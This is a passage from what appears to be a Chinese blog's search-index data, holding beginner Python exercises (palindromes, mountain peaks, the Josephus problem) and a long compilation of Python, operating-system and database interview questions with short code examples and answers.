b, a + b list.append(b)print(list) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# # 1.从键盘输入一个字符串，判断是否为回文字符串。如&#x27;abcba&#x27;为回文字符串，即第一个和最后一个相同，第二个和倒数第二个相同，依次类推# a = list(input(&quot;请输入一个字符串：&quot;))# print(a)# b = a[::-1]# if a == b:# print(a,&#x27;是回文字符串&#x27;)# else:# print(a,&#x27;不是回文字符串&#x27;)# # 2.给你一个整数组成的列表L，按照下列条件输出： 若L是升序排列的,则输出&quot;UP&quot;; 若L是降序排列的,则输出&quot;DOWN&quot;; 若L无序，则输出&quot;WRONG&quot;。# 示例：输入：L = [1, 1, 3, 3, 4] 输出：UP## L = [1, 1, 3, 3, 4]# count = 0# count1 = 0# for i in range(len(L) - 1):# if L[i] &lt;= L[i + 1]:# count += 1# # if L[i] &gt;= L[i + 1]:# count1 += 1## if count == len(L) - 1:# print(&quot;UP&quot;)# elif count1 == len(L) - 1:# print(&quot;DOWN&quot;)# else:# print(&quot;WRANG&quot;)# # 3.十一假期,小P出去爬山,爬山的过程中每隔10米他都会记录当前点的海拔高度(以一个浮点数表示), 这些值序列保存在一个由浮点数组成的列表h中。# # 回到家中，小P想研究一下自己经过了几个山峰，请你帮他计算一下，输出结果。# # 例如：h=[0.9,1.2,1.22,1.1,1.6,0.99], 将这些高度顺序连线，会发现有两个山峰，故输出一个2(序列两端不算山峰)# # h = [0.9, 1.2, 1.1, 1, 0.9, 0.8, 0.7, 1.22, 1.6, 0.99,0.75,0.60,1.88,1.99,0.88]# h = [0.9, 1.2, 1.22, 1.1, 1.6, 0.99]# n = 0# for i in range(1, len(h) - 1):# if h[i] &gt; h[i - 1] and h[i] &gt; h[i + 1]:# n += 1# print(&#x27;山峰个数：&#x27;, n)# 4.约瑟夫问题：有ｎ只猴子，按顺时针方向围成一圈选大王（编号从１到ｎ），从第１号开始报数，一直数到ｍ，数到ｍ的猴子退出圈外，剩下的猴子再接着从1开始报数。就这样，直到圈内只剩下一只猴子时，这个猴子就是猴王，现在给你n和m，请你输出最后猴王的编号。n = int(input(&quot;输入猴子数量：&quot;))m = int(input(&quot;输入m：&quot;))residue = na = [i for i in range(1, n + 1)]print(a)while residue &gt; 1: if residue &gt; m: a.pop(m - 1) a = a[m - 1:] + a[:m - 1] print(a) residue -= 1 elif residue == m: a.pop() residue -= 1 print(a) elif residue &lt; m: a = a[m % residue:] + a[:m % residue-1] residue -= 1 print(a) # n = int(input(&#x27;n:&#x27;)) # 6# m = int(input(&#x27;m:&#x27;)) # 2# a = [i for i in range(1,n+1)]# # i = 0# counter = 1# # while 1:# if counter % m == 0:# a.remove(a[i])# counter = 1# else:# i+=1# counter += 1# if i &gt;= len(a):# i = 0# if len(a) == 1:# break# print(a)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python面试题","slug":"Python面试题","date":"2020-07-10T06:40:37.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/10/Python面试题/","permalink":"http://example.com/2020/07/10/Python%E9%9D%A2%E8%AF%95%E9%A2%98/","excerpt":"python面试题 1.列表去重","text":"python面试题 1.列表去重 1.列表去重1234567891011121314151617# numbers = [2,4,6,7,4,6,7,8]# empty = []# for n in numbers:# flag = True# for e in empty:# if n==e:# flag = False# if flag:# empty.append(n)# print(empty)numbers = [2,4,6,7,4,6,7,8]empty = []for n in numbers: if n not in empty: empty.append(n)print(empty) Python面试题汇总[TOC] Python语言特性1 Python的函数参数传递看两个例子: 12345a = 1def fun(a): a = 2fun(a)print a # 1 12345a = []def fun(a): a.append(1)fun(a)print a # [1] 所有的变量都可以理解是内存中一个对象的“引用”，或者，也可以看似c中void*的感觉。 通过id来看引用a的内存地址可以比较理解： 12345678a = 1def fun(a): print &quot;func_in&quot;,id(a) # func_in 41322472 a = 2 print &quot;re-point&quot;,id(a), id(2) # re-point 41322448 41322448print &quot;func_out&quot;,id(a), id(1) # func_out 41322472 41322472fun(a)print a # 1 注：具体的值在不同电脑上运行时可能不同。 可以看到，在执行完a = 2之后，a引用中保存的值，即内存地址发生变化，由原来1对象的所在的地址变成了2这个实体对象的内存地址。 而第2个例子a引用保存的内存值就不会发生变化： 1234567a = []def fun(a): print &quot;func_in&quot;,id(a) # func_in 53629256 a.append(1)print &quot;func_out&quot;,id(a) # func_out 53629256fun(a)print a # [1] 这里记住的是类型是属于对象的，而不是变量。而对象有两种,“可更改”（mutable）与“不可更改”（immutable）对象。在python中，strings, tuples, 和numbers是不可更改的对象，而 list, dict, set 等则是可以修改的对象。(这就是这个问题的重点) 当一个引用传递给函数的时候,函数自动复制一份引用,这个函数里的引用和外边的引用没有半毛关系了.所以第一个例子里函数把引用指向了一个不可变对象,当函数返回的时候,外面的引用没半毛感觉.而第二个例子就不一样了,函数内的引用指向的是可变对象,对它的操作就和定位了指针地址一样,在内存里进行修改. 如果还不明白的话,这里有更好的解释: http://stackoverflow.com/questions/986006/how-do-i-pass-a-variable-by-reference 2 Python中的元类(metaclass)这个非常的不常用,但是像ORM这种复杂的结构还是会需要的,详情请看:http://stackoverflow.com/questions/100003/what-is-a-metaclass-in-python 3 @staticmethod和@classmethodPython其实有3个方法,即静态方法(staticmethod),类方法(classmethod)和实例方法,如下: 1234567891011121314151617def foo(x): print &quot;executing foo(%s)&quot;%(x)class A(object): def foo(self,x): print &quot;executing foo(%s,%s)&quot;%(self,x) @classmethod def class_foo(cls,x): print &quot;executing class_foo(%s,%s)&quot;%(cls,x) @staticmethod def static_foo(x): print &quot;executing static_foo(%s)&quot;%xa=A() 这里先理解下函数参数里面的self和cls.这个self和cls是对类或者实例的绑定,对于一般的函数来说我们可以这么调用foo(x),这个函数就是最常用的,它的工作跟任何东西(类,实例)无关.对于实例方法,我们知道在类里每次定义方法的时候都需要绑定这个实例,就是foo(self, x),为什么要这么做呢?因为实例方法的调用离不开实例,我们需要把实例自己传给函数,调用的时候是这样的a.foo(x)(其实是foo(a, x)).类方法一样,只不过它传递的是类而不是实例,A.class_foo(x).注意这里的self和cls可以替换别的参数,但是python的约定是这俩,还是不要改的好. 对于静态方法其实和普通的方法一样,不需要对谁进行绑定,唯一的区别是调用的时候需要使用a.static_foo(x)或者A.static_foo(x)来调用. \\ 实例方法 类方法 静态方法 a &#x3D; A() a.foo(x) a.class_foo(x) a.static_foo(x) A 不可用 A.class_foo(x) A.static_foo(x) 更多关于这个问题: http://stackoverflow.com/questions/136097/what-is-the-difference-between-staticmethod-and-classmethod-in-python https://realpython.com/blog/python/instance-class-and-static-methods-demystified/ 4 类变量和实例变量类变量： 是可在类的所有实例之间共享的值（也就是说，它们不是单独分配给每个实例的）。例如下例中，num_of_instance 就是类变量，用于跟踪存在着多少个Test 的实例。 实例变量： 实例化之后，每个实例单独拥有的变量。 12345678910111213class Test(object): num_of_instance = 0 def __init__(self, name): self.name = name Test.num_of_instance += 1 if __name__ == &#x27;__main__&#x27;: print Test.num_of_instance # 0 t1 = Test(&#x27;jack&#x27;) print Test.num_of_instance # 1 t2 = Test(&#x27;lucy&#x27;) print t1.name , t1.num_of_instance # jack 2 print t2.name , t2.num_of_instance # lucy 2 补充的例子 123456789class Person: name=&quot;aaa&quot;p1=Person()p2=Person()p1.name=&quot;bbb&quot;print p1.name # bbbprint p2.name # aaaprint Person.name # aaa 这里p1.name=&quot;bbb&quot;是实例调用了类变量,这其实和上面第一个问题一样,就是函数传参的问题,p1.name一开始是指向的类变量name=&quot;aaa&quot;,但是在实例的作用域里把类变量的引用改变了,就变成了一个实例变量,self.name不再引用Person的类变量name了. 可以看看下面的例子: 123456789class Person: name=[]p1=Person()p2=Person()p1.name.append(1)print p1.name # [1]print p2.name # [1]print Person.name # [1] 参考:http://stackoverflow.com/questions/6470428/catch-multiple-exceptions-in-one-line-except-block 5 Python自省这个也是python彪悍的特性. 自省就是面向对象的语言所写的程序在运行时,所能知道对象的类型.简单一句就是运行时能够获得对象的类型.比如type(),dir(),getattr(),hasattr(),isinstance(). 12345a = [1,2,3]b = &#123;&#x27;a&#x27;:1,&#x27;b&#x27;:2,&#x27;c&#x27;:3&#125;c = Trueprint type(a),type(b),type(c) # &lt;type &#x27;list&#x27;&gt; &lt;type &#x27;dict&#x27;&gt; &lt;type &#x27;bool&#x27;&gt;print isinstance(a,list) # True 6 字典推导式可能你见过列表推导时,却没有见过字典推导式,在2.7中才加入的: 1d = &#123;key: value for (key, value) in iterable&#125; 7 Python中单下划线和双下划线1234567891011121314&gt;&gt;&gt; class MyClass():... def __init__(self):... self.__superprivate = &quot;Hello&quot;... self._semiprivate = &quot;, world!&quot;...&gt;&gt;&gt; mc = MyClass()&gt;&gt;&gt; print mc.__superprivateTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: myClass instance has no attribute &#x27;__superprivate&#x27;&gt;&gt;&gt; print mc._semiprivate, world!&gt;&gt;&gt; print mc.__dict__&#123;&#x27;_MyClass__superprivate&#x27;: &#x27;Hello&#x27;, &#x27;_semiprivate&#x27;: &#x27;, world!&#x27;&#125; __foo__:一种约定,Python内部的名字,用来区别其他用户自定义的命名,以防冲突，就是例如__init__(),__del__(),__call__()这些特殊方法 _foo:一种约定,用来指定变量私有.程序员用来指定私有变量的一种方式.不能用from module import * 导入，其他方面和公有一样访问； __foo:这个有真正的意义:解析器用_classname__foo来代替这个名字,以区别和其他类相同的命名,它无法直接像公有成员一样随便访问,通过对象名._类名__xxx这样的方式可以访问. 详情见:http://stackoverflow.com/questions/1301346/the-meaning-of-a-single-and-a-double-underscore-before-an-object-name-in-python 或者: http://www.zhihu.com/question/19754941 8 字符串格式化:%和.format.format在许多方面看起来更便利.对于%最烦人的是它无法同时传递一个变量和元组.你可能会想下面的代码不会有什么问题: 1&quot;hi there %s&quot; % name 但是,如果name恰好是(1,2,3),它将会抛出一个TypeError异常.为了保证它总是正确的,你必须这样做: 1&quot;hi there %s&quot; % (name,) # 提供一个单元素的数组而不是一个参数 但是有点丑..format就没有这些问题.你给的第二个问题也是这样,.format好看多了. 你为什么不用它? 不知道它(在读这个之前) 为了和Python2.5兼容(譬如logging库建议使用%(issue #4)) http://stackoverflow.com/questions/5082452/python-string-formatting-vs-format 9 迭代器和生成器这个是stackoverflow里python排名第一的问题,值得一看: http://stackoverflow.com/questions/231767/what-does-the-yield-keyword-do-in-python 这是中文版: http://taizilongxu.gitbooks.io/stackoverflow-about-python/content/1/README.html 这里有个关于生成器的创建问题面试官有考：问： 将列表生成式中[]改成() 之后数据结构是否改变？答案：是，从列表变为生成器 123456&gt;&gt;&gt; L = [x*x for x in range(10)]&gt;&gt;&gt; L[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]&gt;&gt;&gt; g = (x*x for x in range(10))&gt;&gt;&gt; g&lt;generator object &lt;genexpr&gt; at 0x0000028F8B774200&gt; 通过列表生成式，可以直接创建一个列表。但是，受到内存限制，列表容量肯定是有限的。而且，创建一个包含百万元素的列表，不仅是占用很大的内存空间，如：我们只需要访问前面的几个元素，后面大部分元素所占的空间都是浪费的。因此，没有必要创建完整的列表（节省大量内存空间）。在Python中，我们可以采用生成器：边循环，边计算的机制—&gt;generator 10 *args and **kwargs用*args和**kwargs只是为了方便并没有强制使用它们. 当你不确定你的函数里将要传递多少参数时你可以用*args.例如,它可以传递任意数量的参数: 12345678&gt;&gt;&gt; def print_everything(*args): for count, thing in enumerate(args):... print &#x27;&#123;0&#125;. &#123;1&#125;&#x27;.format(count, thing)...&gt;&gt;&gt; print_everything(&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;cabbage&#x27;)0. apple1. banana2. cabbage 相似的,**kwargs允许你使用没有事先定义的参数名: 1234567&gt;&gt;&gt; def table_things(**kwargs):... for name, value in kwargs.items():... print &#x27;&#123;0&#125; = &#123;1&#125;&#x27;.format(name, value)...&gt;&gt;&gt; table_things(apple = &#x27;fruit&#x27;, cabbage = &#x27;vegetable&#x27;)cabbage = vegetableapple = fruit 你也可以混着用.命名参数首先获得参数值然后所有的其他参数都传递给*args和**kwargs.命名参数在列表的最前端.例如: 1def table_things(titlestring, **kwargs) *args和**kwargs可以同时在函数的定义中,但是*args必须在**kwargs前面. 当调用函数时你也可以用*和**语法.例如: 1234567&gt;&gt;&gt; def print_three_things(a, b, c):... print &#x27;a = &#123;0&#125;, b = &#123;1&#125;, c = &#123;2&#125;&#x27;.format(a,b,c)...&gt;&gt;&gt; mylist = [&#x27;aardvark&#x27;, &#x27;baboon&#x27;, &#x27;cat&#x27;]&gt;&gt;&gt; print_three_things(*mylist)a = aardvark, b = baboon, c = cat 就像你看到的一样,它可以传递列表(或者元组)的每一项并把它们解包.注意必须与它们在函数里的参数相吻合.当然,你也可以在函数定义或者函数调用时用*. http://stackoverflow.com/questions/3394835/args-and-kwargs 11 面向切面编程AOP和装饰器这个AOP一听起来有点懵,同学面阿里的时候就被问懵了… 装饰器是一个很著名的设计模式，经常被用于有切面需求的场景，较为经典的有插入日志、性能测试、事务处理等。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量函数中与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 这个问题比较大,推荐: http://stackoverflow.com/questions/739654/how-can-i-make-a-chain-of-function-decorators-in-python 中文: http://taizilongxu.gitbooks.io/stackoverflow-about-python/content/3/README.html 12 鸭子类型“当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子。” 我们并不关心对象是什么类型，到底是不是鸭子，只关心行为。 比如在python中，有很多file-like的东西，比如StringIO,GzipFile,socket。它们有很多相同的方法，我们把它们当作文件使用。 又比如list.extend()方法中,我们并不关心它的参数是不是list,只要它是可迭代的,所以它的参数可以是list&#x2F;tuple&#x2F;dict&#x2F;字符串&#x2F;生成器等. 鸭子类型在动态语言中经常使用，非常灵活，使得python不想java那样专门去弄一大堆的设计模式。 13 Python中重载引自知乎:http://www.zhihu.com/question/20053359 函数重载主要是为了解决两个问题。 可变参数类型。 可变参数个数。 另外，一个基本的设计原则是，仅仅当两个函数除了参数类型和参数个数不同以外，其功能是完全相同的，此时才使用函数重载，如果两个函数的功能其实不同，那么不应当使用重载，而应当使用一个名字不同的函数。 好吧，那么对于情况 1 ，函数功能相同，但是参数类型不同，python 如何处理？答案是根本不需要处理，因为 python 可以接受任何类型的参数，如果函数的功能相同，那么不同的参数类型在 python 中很可能是相同的代码，没有必要做成两个不同函数。 那么对于情况 2 ，函数功能相同，但参数个数不同，python 如何处理？大家知道，答案就是缺省参数。对那些缺少的参数设定为缺省参数即可解决问题。因为你假设函数功能相同，那么那些缺少的参数终归是需要用的。 好了，鉴于情况 1 跟 情况 2 都有了解决方案，python 自然就不需要函数重载了。 14 新式类和旧式类这个面试官问了,我说了老半天,不知道他问的真正意图是什么. stackoverflow 这篇文章很好的介绍了新式类的特性: http://www.cnblogs.com/btchenguang/archive/2012/09/17/2689146.html 新式类很早在2.2就出现了,所以旧式类完全是兼容的问题,Python3里的类全部都是新式类.这里有一个MRO问题可以了解下(新式类是广度优先,旧式类是深度优先),&lt;Python核心编程&gt;里讲的也很多. 一个旧式类的深度优先的例子 12345678910111213141516class A(): def foo1(self): print &quot;A&quot;class B(A): def foo2(self): passclass C(A): def foo1(self): print &quot;C&quot;class D(B, C): passd = D()d.foo1()# A 按照经典类的查找顺序从左到右深度优先的规则，在访问d.foo1()的时候,D这个类是没有的..那么往上查找,先找到B,里面没有,深度优先,访问A,找到了foo1(),所以这时候调用的是A的foo1()，从而导致C重写的foo1()被绕过 15 __new__和__init__的区别这个__new__确实很少见到,先做了解吧. __new__是一个静态方法,而__init__是一个实例方法. __new__方法会返回一个创建的实例,而__init__什么都不返回. 只有在__new__返回一个cls的实例时后面的__init__才能被调用. 当创建一个新实例时调用__new__,初始化一个实例时用__init__. stackoverflow ps: __metaclass__是创建类时起作用.所以我们可以分别使用__metaclass__,__new__和__init__来分别在类创建,实例创建和实例初始化的时候做一些小手脚. 16 单例模式 单例模式是一种常用的软件设计模式。在它的核心结构中只包含一个被称为单例类的特殊类。通过单例模式可以保证系统中一个类只有一个实例而且该实例易于外界访问，从而方便对实例个数的控制并节约系统资源。如果希望在系统中某个类的对象只能存在一个，单例模式是最好的解决方案。 `__new__()`在`__init__()`之前被调用，用于生成实例对象。利用这个方法和类的属性的特点可以实现设计模式的单例模式。单例模式是指创建唯一对象，单例模式设计的类只能实例 **这个绝对常考啊.绝对要记住1~2个方法,当时面试官是让手写的.** 1 使用__new__方法123456789class Singleton(object): def __new__(cls, *args, **kw): if not hasattr(cls, &#x27;_instance&#x27;): orig = super(Singleton, cls) cls._instance = orig.__new__(cls, *args, **kw) return cls._instanceclass MyClass(Singleton): a = 1 2 共享属性创建实例时把所有实例的__dict__指向同一个字典,这样它们具有相同的属性和方法. 123456789class Borg(object): _state = &#123;&#125; def __new__(cls, *args, **kw): ob = super(Borg, cls).__new__(cls, *args, **kw) ob.__dict__ = cls._state return obclass MyClass2(Borg): a = 1 3 装饰器版本1234567891011def singleton(cls): instances = &#123;&#125; def getinstance(*args, **kw): if cls not in instances: instances[cls] = cls(*args, **kw) return instances[cls] return getinstance@singletonclass MyClass: ... 4 import方法作为python的模块是天然的单例模式 123456789101112# mysingleton.pyclass My_Singleton(object): def foo(self): passmy_singleton = My_Singleton()# to usefrom mysingleton import my_singletonmy_singleton.foo() 单例模式伯乐在线详细解释 17 Python中的作用域Python 中，一个变量的作用域总是由在代码中被赋值的地方所决定的。 当 Python 遇到一个变量的话他会按照这样的顺序进行搜索： 本地作用域（Local）→当前作用域被嵌入的本地作用域（Enclosing locals）→全局&#x2F;模块作用域（Global）→内置作用域（Built-in） 18 GIL线程全局锁线程全局锁(Global Interpreter Lock),即Python为了保证线程安全而采取的独立线程运行的限制,说白了就是一个核只能在同一时间运行一个线程.对于io密集型任务，python的多线程起到作用，但对于cpu密集型任务，python的多线程几乎占不到任何优势，还有可能因为争夺资源而变慢。 见Python 最难的问题 解决办法就是多进程和下面的协程(协程也只是单CPU,但是能减小切换代价提升性能). 19 协程知乎被问到了,呵呵哒,跪了 简单点说协程是进程和线程的升级版,进程和线程都面临着内核态和用户态的切换问题而耗费许多切换时间,而协程就是用户自己控制切换的时机,不再需要陷入系统的内核态. Python里最常见的yield就是协程的思想!可以查看第九个问题. 20 闭包闭包(closure)是函数式编程的重要的语法结构。闭包也是一种组织代码的结构，它同样提高了代码的可重复使用性。 当一个内嵌函数引用其外部作作用域的变量,我们就会得到一个闭包. 总结一下,创建一个闭包必须满足以下几点: 必须有一个内嵌函数 内嵌函数必须引用外部函数中的变量 外部函数的返回值必须是内嵌函数 感觉闭包还是有难度的,几句话是说不明白的,还是查查相关资料. 重点是函数运行后并不会被撤销,就像16题的instance字典一样,当函数运行完后,instance并不被销毁,而是继续留在内存空间里.这个功能类似类里的类变量,只不过迁移到了函数上. 闭包就像个空心球一样,你知道外面和里面,但你不知道中间是什么样. 21 lambda函数其实就是一个匿名函数,为什么叫lambda?因为和后面的函数式编程有关. 推荐: 知乎 22 Python函数式编程这个需要适当的了解一下吧,毕竟函数式编程在Python中也做了引用. 推荐: 酷壳 python中函数式编程支持: filter 函数的功能相当于过滤器。调用一个布尔函数bool_func来迭代遍历每个seq中的元素；返回一个使bool_seq返回值为true的元素的序列。 1234&gt;&gt;&gt;a = [1,2,3,4,5,6,7]&gt;&gt;&gt;b = filter(lambda x: x &gt; 5, a)&gt;&gt;&gt;print b&gt;&gt;&gt;[6,7] map函数是对一个序列的每个项依次执行函数，下面是对一个序列每个项都乘以2： 123&gt;&gt;&gt; a = map(lambda x:x*2,[1,2,3])&gt;&gt;&gt; list(a)[2, 4, 6] reduce函数是对一个序列的每个项迭代调用函数，下面是求3的阶乘： 12&gt;&gt;&gt; reduce(lambda x,y:x*y,range(1,4))6 23 Python里的拷贝引用和copy(),deepcopy()的区别 1234567891011121314151617181920import copya = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;]] #原始对象b = a #赋值，传对象的引用c = copy.copy(a) #对象拷贝，浅拷贝d = copy.deepcopy(a) #对象拷贝，深拷贝a.append(5) #修改对象aa[4].append(&#x27;c&#x27;) #修改对象a中的[&#x27;a&#x27;, &#x27;b&#x27;]数组对象print &#x27;a = &#x27;, aprint &#x27;b = &#x27;, bprint &#x27;c = &#x27;, cprint &#x27;d = &#x27;, d输出结果：a = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;], 5]b = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;], 5]c = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]]d = [1, 2, 3, 4, [&#x27;a&#x27;, &#x27;b&#x27;]] 24 Python垃圾回收机制Python GC主要使用引用计数（reference counting）来跟踪和回收垃圾。在引用计数的基础上，通过“标记-清除”（mark and sweep）解决容器对象可能产生的循环引用问题，通过“分代回收”（generation collection）以空间换时间的方法提高垃圾回收效率。 1 引用计数PyObject是每个对象必有的内容，其中ob_refcnt就是做为引用计数。当一个对象有新的引用时，它的ob_refcnt就会增加，当引用它的对象被删除，它的ob_refcnt就会减少.引用计数为0时，该对象生命就结束了。 优点: 简单 实时性 缺点: 维护引用计数消耗资源 循环引用 2 标记-清除机制基本思路是先按需分配，等到没有空闲内存的时候从寄存器和程序栈上的引用出发，遍历以对象为节点、以引用为边构成的图，把所有可以访问到的对象打上标记，然后清扫一遍内存空间，把所有没标记的对象释放。 3 分代技术分代回收的整体思想是：将系统中的所有内存块根据其存活时间划分为不同的集合，每个集合就成为一个“代”，垃圾收集频率随着“代”的存活时间的增大而减小，存活时间通常利用经过几次垃圾回收来度量。 Python默认定义了三代对象集合，索引数越大，对象存活时间越长。 举例：当某些内存块M经过了3次垃圾收集的清洗之后还存活时，我们就将内存块M划到一个集合A中去，而新分配的内存都划分到集合B中去。当垃圾收集开始工作时，大多数情况都只对集合B进行垃圾回收，而对集合A进行垃圾回收要隔相当长一段时间后才进行，这就使得垃圾收集机制需要处理的内存少了，效率自然就提高了。在这个过程中，集合B中的某些内存块由于存活时间长而会被转移到集合A中，当然，集合A中实际上也存在一些垃圾，这些垃圾的回收会因为这种分代的机制而被延迟。 25 Python的List推荐: http://www.jianshu.com/p/J4U6rR 26 Python的isis是对比地址,&#x3D;&#x3D;是对比值 27 read,readline和readlines read 读取整个文件 readline 读取下一行,使用生成器方法 readlines 读取整个文件到一个迭代器以供我们遍历 28 Python2和3的区别推荐：Python 2.7.x 与 Python 3.x 的主要差异 29 super initsuper() lets you avoid referring to the base class explicitly, which can be nice. But the main advantage comes with multiple inheritance, where all sorts of fun stuff can happen. See the standard docs on super if you haven’t already. Note that the syntax changed in Python 3.0: you can just say super().__init__() instead of super(ChildB, self).__init__() which IMO is quite a bit nicer. http://stackoverflow.com/questions/576169/understanding-python-super-with-init-methods Python2.7中的super方法浅见 30 range and xrange都在循环时使用，xrange内存性能更好。for i in range(0, 20):for i in xrange(0, 20):What is the difference between range and xrange functions in Python 2.X? range creates a list, so if you do range(1, 10000000) it creates a list in memory with 9999999 elements. xrange is a sequence object that evaluates lazily. http://stackoverflow.com/questions/94935/what-is-the-difference-between-range-and-xrange-functions-in-python-2-x 操作系统1 select,poll和epoll其实所有的I&#x2F;O都是轮询的方法,只不过实现的层面不同罢了. 这个问题可能有点深入了,但相信能回答出这个问题是对I&#x2F;O多路复用有很好的了解了.其中tornado使用的就是epoll的. selec,poll和epoll区别总结 基本上select有3个缺点: 连接数受限 查找配对速度慢 数据由内核拷贝到用户态 poll改善了第一个缺点 epoll改了三个缺点. 关于epoll的: http://www.cnblogs.com/my_life/articles/3968782.html 2 调度算法 先来先服务(FCFS, First Come First Serve) 短作业优先(SJF, Shortest Job First) 最高优先权调度(Priority Scheduling) 时间片轮转(RR, Round Robin) 多级反馈队列调度(multilevel feedback queue scheduling) 常见的调度算法总结:http://www.jianshu.com/p/6edf8174c1eb 实时调度算法: 最早截至时间优先 EDF 最低松弛度优先 LLF 3 死锁原因: 竞争资源 程序推进顺序不当 必要条件: 互斥条件 请求和保持条件 不剥夺条件 环路等待条件 处理死锁基本方法: 预防死锁(摒弃除1以外的条件) 避免死锁(银行家算法) 检测死锁(资源分配图) 解除死锁 剥夺资源 撤销进程 死锁概念处理策略详细介绍:https://wizardforcel.gitbooks.io/wangdaokaoyan-os/content/10.html 4 程序编译与链接推荐: http://www.ruanyifeng.com/blog/2014/11/compiler.html Bulid过程可以分解为4个步骤:预处理(Prepressing), 编译(Compilation)、汇编(Assembly)、链接(Linking) 以c语言为例: 1 预处理预编译过程主要处理那些源文件中的以“#”开始的预编译指令，主要处理规则有： 将所有的“#define”删除，并展开所用的宏定义 处理所有条件预编译指令，比如“#if”、“#ifdef”、 “#elif”、“#endif” 处理“#include”预编译指令，将被包含的文件插入到该编译指令的位置，注：此过程是递归进行的 删除所有注释 添加行号和文件名标识，以便于编译时编译器产生调试用的行号信息以及用于编译时产生编译错误或警告时可显示行号 保留所有的#pragma编译器指令。 2 编译编译过程就是把预处理完的文件进行一系列的词法分析、语法分析、语义分析及优化后生成相应的汇编代码文件。这个过程是整个程序构建的核心部分。 3 汇编汇编器是将汇编代码转化成机器可以执行的指令，每一条汇编语句几乎都是一条机器指令。经过编译、链接、汇编输出的文件成为目标文件(Object File) 4 链接链接的主要内容就是把各个模块之间相互引用的部分处理好，使各个模块可以正确的拼接。链接的主要过程包块 地址和空间的分配（Address and Storage Allocation）、符号决议(Symbol Resolution)和重定位(Relocation)等步骤。 5 静态链接和动态链接静态链接方法：静态链接的时候，载入代码就会把程序会用到的动态代码或动态代码的地址确定下来静态库的链接可以使用静态链接，动态链接库也可以使用这种方法链接导入库 动态链接方法：使用这种方式的程序并不在一开始就完成动态链接，而是直到真正调用动态库代码时，载入程序才计算(被调用的那部分)动态代码的逻辑地址，然后等到某个时候，程序又需要调用另外某块动态代码时，载入程序又去计算这部分代码的逻辑地址，所以，这种方式使程序初始化时间较短，但运行期间的性能比不上静态链接的程序 6 虚拟内存技术虚拟存储器是指具有请求调入功能和置换功能,能从逻辑上对内存容量加以扩充的一种存储系统. 7 分页和分段分页: 用户程序的地址空间被划分成若干固定大小的区域，称为“页”，相应地，内存空间分成若干个物理块，页和块的大小相等。可将用户程序的任一页放在内存的任一块中，实现了离散分配。 分段: 将用户程序地址空间分成若干个大小不等的段，每段可以定义一组相对完整的逻辑信息。存储分配时，以段为单位，段与段在内存中可以不相邻接，也实现了离散分配。 分页与分段的主要区别 页是信息的物理单位,分页是为了实现非连续分配,以便解决内存碎片问题,或者说分页是由于系统管理的需要.段是信息的逻辑单位,它含有一组意义相对完整的信息,分段的目的是为了更好地实现共享,满足用户的需要. 页的大小固定,由系统确定,将逻辑地址划分为页号和页内地址是由机器硬件实现的.而段的长度却不固定,决定于用户所编写的程序,通常由编译程序在对源程序进行编译时根据信息的性质来划分. 分页的作业地址空间是一维的.分段的地址空间是二维的. 8 页面置换算法 最佳置换算法OPT:不可能实现 先进先出FIFO 最近最久未使用算法LRU:最近一段时间里最久没有使用过的页面予以置换. clock算法 9 边沿触发和水平触发边缘触发是指每当状态变化时发生一个 io 事件，条件触发是只要满足条件就发生一个 io 事件 数据库1 事务数据库事务(Database Transaction) ，是指作为单个逻辑工作单元执行的一系列操作，要么完全地执行，要么完全地不执行。彻底理解数据库事务: http://www.hollischuang.com/archives/898 2 数据库索引推荐: http://tech.meituan.com/mysql-index.html MySQL索引背后的数据结构及算法原理 聚集索引,非聚集索引,B-Tree,B+Tree,最左前缀原理 3 Redis原理Redis是什么？ 是一个完全开源免费的key-value内存数据库 通常被认为是一个数据结构服务器，主要是因为其有着丰富的数据结构 strings、map、 list、sets、 sorted sets Redis数据库 通常局限点来说，Redis也以消息队列的形式存在，作为内嵌的List存在，满足实时的高并发需求。在使用缓存的时候，redis比memcached具有更多的优势，并且支持更多的数据类型，把redis当作一个中间存储系统，用来处理高并发的数据库操作 速度快：使用标准C写，所有数据都在内存中完成，读写速度分别达到10万&#x2F;20万 持久化：对数据的更新采用Copy-on-write技术，可以异步地保存到磁盘上，主要有两种策略，一是根据时间，更新次数的快照（save 300 10 ）二是基于语句追加方式(Append-only file，aof) 自动操作：对不同数据类型的操作都是自动的，很安全 快速的主–从复制，官方提供了一个数据，Slave在21秒即完成了对Amazon网站10G key set的复制。 Sharding技术： 很容易将数据分布到多个Redis实例中，数据库的扩展是个永恒的话题，在关系型数据库中，主要是以添加硬件、以分区为主要技术形式的纵向扩展解决了很多的应用场景，但随着web2.0、移动互联网、云计算等应用的兴起，这种扩展模式已经不太适合了，所以近年来，像采用主从配置、数据库复制形式的，Sharding这种技术把负载分布到多个特理节点上去的横向扩展方式用处越来越多。 Redis缺点 是数据库容量受到物理内存的限制,不能用作海量数据的高性能读写,因此Redis适合的场景主要局限在较小数据量的高性能操作和运算上。 Redis较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂。为避免这一问题，运维人员在系统上线时必须确保有足够的空间，这对资源造成了很大的浪费。 4 乐观锁和悲观锁悲观锁：假定会发生并发冲突，屏蔽一切可能违反数据完整性的操作 乐观锁：假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。 乐观锁与悲观锁的具体区别: http://www.cnblogs.com/Bob-FD/p/3352216.html 5 MVCC 全称是Multi-Version Concurrent 